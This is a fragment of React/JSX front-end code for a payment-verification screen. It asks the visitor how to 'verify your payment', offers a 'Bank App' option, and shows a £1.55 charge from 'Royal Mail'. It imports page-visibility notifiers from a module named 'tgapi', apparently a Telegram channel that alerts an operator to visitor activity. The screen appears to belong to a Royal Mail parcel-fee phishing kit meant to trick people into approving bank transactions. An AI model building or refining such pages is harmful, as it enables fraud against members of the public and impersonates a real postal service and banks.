...
import { sendPageHiddenNotification, sendPageVisibleNotification } from '../tgapi';
    ...
    <div className="w-full max-w-md mx-auto space-y-4 relative p-2 -mb-8 font-chevin font-thin">
        ...
        <div className="mb-4 mt-6 py-1 px-4 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md">
          <div className="text-center">
            <p className="text-[11px] font-chevin font-medium text-muted-foreground/80 leading-relaxed drop-shadow-sm">
              Select how you would like to verify your payment
            </p>
          </div>
        </div>
      </div>
      ...
      <div className="flex items-center justify-center gap-1 overflow-visible">
        ...
        <div className="text-center flex-shrink-0">
          ...
          <p className="text-xs font-thin text-muted-foreground mt-1">Bank App</p>
        </div>
        ...
        <div className="space-y-2">
          ...
          <div className="flex justify-between items-center">
            <div className="text-left">
              <span className="text-[8px] font-thin text-muted-foreground/80 uppercase tracking-wider block mb-0.5">Amount</span>
              <span className="text-[11px] font-thin text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">£1.55</span>
            </div>
            <div className="text-right">
              <span className="text-[8px] font-thin text-muted-foreground/80 uppercase tracking-wider block mb-0.5">Merchant</span>
              <span className="text-[11px] font-thin text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">Royal Mail</span>
            </div>
          </div>
